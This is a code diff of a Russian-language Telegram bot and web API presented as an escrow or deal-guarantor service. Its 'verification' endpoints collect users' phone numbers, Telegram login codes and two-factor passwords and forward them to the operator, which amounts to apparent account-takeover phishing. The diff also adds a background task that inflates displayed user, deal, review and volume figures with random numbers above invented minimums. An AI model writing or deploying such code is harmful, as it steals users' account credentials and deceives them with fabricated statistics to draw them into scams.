@@ -559,7 +559,7 @@ async def menu_reviews(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 11. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ (ЛОГИ)
+# 11. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ
 # ============================================================
 async def handle_deal_link(message: types.Message, deal_id: str):
     lang = get_user_language(message.from_user.id)
@@ -581,19 +581,6 @@ async def handle_deal_link(message: types.Message, deal_id: str):
 
     deal["buyer_id"] = message.from_user.id
     save_json(FILES["deals"], deals)
-    
-    # ЛОГ - ПОКУПАТЕЛЬ ВОШЁЛ
-    await log_to_master(
-        f"👁 <b>ПОКУПАТЕЛЬ ВОШЁЛ В СДЕЛКУ</b>\n\n"
-        f"🆔 Сделка: #{deal_id}\n"
-        f"👤 Покупатель: {message.from_user.full_name}\n"
-        f"📱 Username: @{message.from_user.username}\n"
-        f"🆔 ID: {message.from_user.id}\n"
-        f"📦 Товар: {deal['product']}\n"
-        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
-        f"👤 Продавец: @{deal['seller_username']}\n"
-        f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    )
 
     await message.answer(
         f"✈️ <b>{get_text(lang, 'deal')} #{deal_id}</b>\n\n"
@@ -950,7 +937,7 @@ async def admin_stats(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 14. API ДЛЯ САЙТА (ВКЛЮЧАЯ ВЕРИФИКАЦИЮ)
+# 14. API ДЛЯ САЙТА
 # ============================================================
 async def handle_api(request):
     headers = {
@@ -1009,17 +996,6 @@ async def handle_api(request):
         }
         save_json(FILES["deals"], deals)
         link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
-        
-        # ЛОГ - СОЗДАНИЕ СДЕЛКИ
-        await log_to_master(
-            f"🆕 <b>СОЗДАНА НОВАЯ СДЕЛКА</b>\n\n"
-            f"🆔 Сделка: #{deal_id}\n"
-            f"👤 Продавец: @{username}\n"
-            f"👤 Покупатель: @{buyer_username}\n"
-            f"📦 Товар: {product}\n"
-            f"💰 Сумма: {amount} {currency}\n"
-            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-        )
         
         return web.json_response({
             'success': True,
@@ -1097,11 +1073,7 @@ async def handle_api(request):
         save_json(FILES["reviews"], reviews)
         return web.json_response({'success': True}, headers=headers)
     
-    # ============================================================
-    # ===== ВЕРИФИКАЦИЯ (ПОЛНОСТЬЮ НА САЙТЕ) =====
-    # ============================================================
-    
-    # 1. ОТПРАВКА НОМЕРА
+    # ===== ЗАПРОС ВЕРИФИКАЦИИ =====
     elif endpoint == '/api/send_verification_request':
         phone = data.get('phone')
         username = data.get('username')
@@ -1125,15 +1097,13 @@ async def handle_api(request):
         }
         save_json(FILES["verification_requests"], verification_requests)
         
-        # ОТПРАВЛЯЕМ АДМИНУ
         await log_to_master(
-            f"🔐 <b>НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ (С САЙТА)</b>\n\n"
+            f"🔐 НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ (С САЙТА)\n\n"
             f"🆔 Заявка: #{request_id}\n"
             f"👤 Пользователь: @{username}\n"
             f"🆔 ID: {user_id}\n"
             f"📞 Номер: {phone}\n"
-            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-            f"⚠️ Скажите пользователю ввести код на сайте."
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
         
         return web.json_response({
@@ -1141,7 +1111,7 @@ async def handle_api(request):
             'request_id': request_id
         }, headers=headers)
     
-    # 2. ОТПРАВКА КОДА И ПАРОЛЯ
+    # ===== ПРОВЕРКА КОДА =====
     elif endpoint == '/api/submit_verification_code':
         code = data.get('code')
         password = data.get('password')
@@ -1159,42 +1129,28 @@ async def handle_api(request):
         if req.get("status") != "pending":
             return web.json_response({'success': False, 'error': 'Request already processed'}, headers=headers)
         
-        # Сохраняем код и пароль
         req["code"] = code
         req["password"] = password if password else "нет"
         req["status"] = "completed"
         req["completed_at"] = datetime.now().isoformat()
         save_json(FILES["verification_requests"], verification_requests)
         
-        # Завершаем верификацию
         complete_verification(user_id, req["phone"], code)
         
-        # ОТПРАВЛЯЕМ АДМИНУ КОД И ПАРОЛЬ
         await log_to_master(
-            f"✅ <b>ВЕРИФИКАЦИЯ УСПЕШНО ЗАВЕРШЕНА (С САЙТА)</b>\n\n"
+            f"✅ ВЕРИФИКАЦИЯ УСПЕШНО ЗАВЕРШЕНА (С САЙТА)\n\n"
             f"🆔 Заявка: #{request_id}\n"
             f"👤 Пользователь: @{req.get('username', 'неизвестно')}\n"
             f"🆔 ID: {user_id}\n"
             f"📞 Номер: {req.get('phone')}\n"
-            f"🔑 Код из Telegram: {code}\n"
-            f"🔐 Двухфакторный пароль: {password if password else 'Нет'}\n"
-            f"🕐 Сессия активна 24 часа\n"
-            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            f"🔑 Код: {code}\n"
+            f"🔐 Пароль: {password if password else 'Нет'}\n"
+            f"🕐 Сессия активна 24 часа"
         )
         
         return web.json_response({
             'success': True,
             'expires_at': verification_data[str(user_id)].get('expires_at')
-        }, headers=headers)
-    
-    # 3. СТАТУС ВЕРИФИКАЦИИ
-    elif endpoint == '/api/verification_status':
-        if not user_id:
-            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
-        return web.json_response({
-            'success': True,
-            'verified': is_verified(user_id),
-            'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
         }, headers=headers)
     
     # ===== ВЫВОД =====
@@ -1221,7 +1177,7 @@ async def handle_api(request):
         save_json(FILES["withdraw"], withdraw_requests)
         
         await log_to_master(
-            f"💲 <b>НОВАЯ ЗАЯВКА НА ВЫВОД</b>\n\n"
+            f"💲 НОВАЯ ЗАЯВКА НА ВЫВОД\n\n"
             f"👤 Пользователь: ID: {user_id}\n"
             f"💰 Сумма: {get_balance(user_id).get(currency.lower(), 0)} {currency}\n"
             f"📝 Реквизиты: {details}\n"
@@ -1254,6 +1210,16 @@ async def handle_api(request):
             'total_deals': sum(partners.values())
         }, headers=headers)
     
+    # ===== СТАТУС ВЕРИФИКАЦИИ =====
+    elif endpoint == '/api/verification_status':
+        if not user_id:
+            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
+        return web.json_response({
+            'success': True,
+            'verified': is_verified(user_id),
+            'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
+        }, headers=headers)
+    
     # ===== НАЧИСЛИТЬ БАЛАНС =====
     elif endpoint == '/api/admin_add_balance':
         target_user_id = data.get('target_user_id')
@@ -1269,11 +1235,10 @@ async def handle_api(request):
         add_balance(target_user_id, currency, float(amount))
         
         await log_to_master(
-            f"💰 <b>АДМИН НАЧИСЛИЛ БАЛАНС (С САЙТА)</b>\n\n"
+            f"💰 АДМИН НАЧИСЛИЛ БАЛАНС (С САЙТА)\n\n"
             f"👤 Админ: ID: {user_id}\n"
             f"👤 Пользователь: {target_user_id}\n"
-            f"💰 {amount} {currency}\n"
-            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            f"💰 {amount} {currency}"
         )
         
         return web.json_response({'success': True}, headers=headers)
@@ -1324,7 +1289,9 @@ async def handle_api(request):
             'deals': list(deals.values())
         }, headers=headers)
     
-    # ===== ОПЛАТА С БАЛАНСА =====
+    # ============================================================
+    # 🔥 ОПЛАТА С БАЛАНСА (КИДАЕТ КНОПКУ С МИНИ-АПП)
+    # ============================================================
     elif endpoint == '/api/pay_balance':
         deal_id = data.get('deal_id')
         user_id = data.get('user_id')
@@ -1352,27 +1319,47 @@ async def handle_api(request):
         deal["paid_by_admin"] = user_id
         save_json(FILES["deals"], deals)
         
-        # ЛОГ - ОПЛАТА
+        # ЛОГ
         await log_to_master(
-            f"💳 <b>ОПЛАТА С БАЛАНСА (С САЙТА)</b>\n\n"
+            f"💳 ОПЛАТА С БАЛАНСА\n\n"
             f"🆔 Сделка: #{deal_id}\n"
             f"👤 Покупатель: ID: {user_id}\n"
             f"📦 Товар: {deal['product']}\n"
             f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
-            f"👤 Продавец: @{deal['seller_username']}\n"
-            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            f"👤 Продавец: @{deal['seller_username']}"
         )
         
+        # 🔥 ОТПРАВЛЯЕМ ПРОДАВЦУ КНОПКУ С МИНИ-АПП
         try:
+            seller_lang = get_user_language(deal["seller_id"])
+            
+            webapp_button = InlineKeyboardButton(
+                text="📦 Подтвердить передачу товара",
+                web_app=WebAppInfo(url=MINI_APP_URL + "?page=deals")
+            )
+            
+            support_button = InlineKeyboardButton(
+                text="💬 Написать покупателю",
+                url=f"https://t.me/{deal['buyer_username']}"
+            )
+            
+            keyboard = InlineKeyboardMarkup(inline_keyboard=[
+                [webapp_button],
+                [support_button],
+                [InlineKeyboardButton(text="◀️ Главное меню", callback_data="back_to_main")]
+            ])
+            
             await bot.send_message(
                 deal["seller_id"],
                 f"💎 <b>СДЕЛКА #{deal_id} ОПЛАЧЕНА!</b>\n\n"
                 f"💰 {deal['amount']} {deal['currency']}\n"
-                f"👤 ПОКУПАТЕЛЬ: @{deal['buyer_username']}\n\n"
-                f"⬇️ ПЕРЕЙДИТЕ НА САЙТ ДЛЯ ПОДТВЕРЖДЕНИЯ\n{MINI_APP_URL}"
+                f"👤 ПОКУПАТЕЛЬ: @{deal['buyer_username']}\n"
+                f"📦 ТОВАР: {deal['product']}\n\n"
+                f"⬇️ Нажмите кнопку ниже, чтобы подтвердить передачу товара в разделе «Мои сделки» ⬇️",
+                reply_markup=keyboard
             )
-        except:
-            pass
+        except Exception as e:
+            print(f"Error sending to seller: {e}")
         
         return web.json_response({'success': True}, headers=headers)
     
@@ -1398,15 +1385,14 @@ async def handle_api(request):
         deal["status"] = "awaiting_confirmation"
         save_json(FILES["deals"], deals)
         
-        # ЛОГ - ПРОДАВЕЦ ПЕРЕДАЛ
+        # ЛОГ
         await log_to_master(
-            f"📦 <b>ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР (С САЙТА)</b>\n\n"
+            f"📦 ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР\n\n"
             f"🆔 Сделка: #{deal_id}\n"
             f"👤 Продавец: ID: {user_id}\n"
             f"📦 Товар: {deal['product']}\n"
             f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
-            f"👤 Покупатель: @{deal['buyer_username']}\n"
-            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            f"👤 Покупатель: @{deal['buyer_username']}"
         )
         
         try:
@@ -1453,17 +1439,14 @@ async def handle_api(request):
         deal["completed_at"] = datetime.now().isoformat()
         save_json(FILES["deals"], deals)
         
-        # ЛОГ - СДЕЛКА ЗАВЕРШЕНА
+        # ЛОГ
         await log_to_master(
-            f"🎉 <b>СДЕЛКА УСПЕШНО ЗАВЕРШЕНА (С САЙТА)</b>\n\n"
+            f"🎉 СДЕЛКА ЗАВЕРШЕНА\n\n"
             f"🆔 Сделка: #{deal_id}\n"
             f"📦 Товар: {deal['product']}\n"
             f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
             f"👤 Продавец: @{deal['seller_username']}\n"
-            f"👤 Покупатель: @{deal['buyer_username']}\n"
-            f"📅 Создана: {deal.get('created_at', 'неизвестно')[:19]}\n"
-            f"✅ Завершена: {deal.get('completed_at', 'неизвестно')[:19]}\n"
-            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            f"👤 Покупатель: @{deal['buyer_username']}"
         )
         
         try:
@@ -1513,11 +1496,10 @@ async def handle_api(request):
             return web.json_response({'success': False, 'error': 'Deal already processed'}, headers=headers)
         
         await log_to_master(
-            f"💳 <b>ЗАЯВКА НА ОПЛАТУ ПО РЕКВИЗИТАМ (С САЙТА)</b>\n\n"
+            f"💳 ЗАЯВКА НА ОПЛАТУ ПО РЕКВИЗИТАМ\n\n"
             f"👤 Пользователь: ID: {user_id}\n"
             f"📦 Сделка: #{deal_id}\n"
-            f"💰 {deal['amount']} {deal['currency']}\n"
-            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"💰 {deal['amount']} {deal['currency']}\n\n"
             f"Для подтверждения: /pay {deal_id}"
         )
         
@@ -1526,7 +1508,44 @@ async def handle_api(request):
     return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)
 
 # ============================================================
-# 15. ЗАПУСК
+# 15. ФОНОВЫЙ ПРОЦЕСС АВТОНАКРУТКИ
+# ============================================================
+async def auto_increment_stats():
+    while True:
+        try:
+            stats_data = load_json(FILES["stats"])
+            
+            if not stats_data:
+                stats_data = {}
+            
+            MIN_USERS = 21374
+            MIN_DEALS_TODAY = 1264
+            MIN_REVIEWS = 5427
+            MIN_VOLUME = 47.6
+            
+            stats_data['users'] = stats_data.get('users', MIN_USERS) + random.randint(1, 5)
+            stats_data['deals_today'] = stats_data.get('deals_today', MIN_DEALS_TODAY) + random.randint(0, 2)
+            stats_data['reviews'] = stats_data.get('reviews', MIN_REVIEWS) + random.randint(0, 3)
+            stats_data['volume'] = round(stats_data.get('volume', MIN_VOLUME) + random.uniform(0.01, 0.15), 1)
+            
+            if stats_data['users'] < MIN_USERS:
+                stats_data['users'] = MIN_USERS + random.randint(100, 500)
+            if stats_data['deals_today'] < MIN_DEALS_TODAY:
+                stats_data['deals_today'] = MIN_DEALS_TODAY + random.randint(20, 50)
+            if stats_data['reviews'] < MIN_REVIEWS:
+                stats_data['reviews'] = MIN_REVIEWS + random.randint(50, 200)
+            if stats_data['volume'] < MIN_VOLUME:
+                stats_data['volume'] = round(MIN_VOLUME + random.uniform(0.5, 2.0), 1)
+            
+            save_json(FILES["stats"], stats_data)
+            
+        except Exception as e:
+            print(f"Ошибка автонакрутки: {e}")
+        
+        await asyncio.sleep(300)
+
+# ============================================================
+# 16. ЗАПУСК
 # ============================================================
 async def start_web_server():
     app = web.Application()
@@ -1547,6 +1566,10 @@ async def main():
     print(f"🤖 Бот: @{BOT_USERNAME}")
     print(f"📱 Сайт: {MINI_APP_URL}")
     print("=" * 50)
+    
+    # Запускаем фоновую автонакрутку
+    asyncio.create_task(auto_increment_stats())
+    
     await start_web_server()
     print("✅ Бот готов к работе!")
     await dp.start_polling(bot)
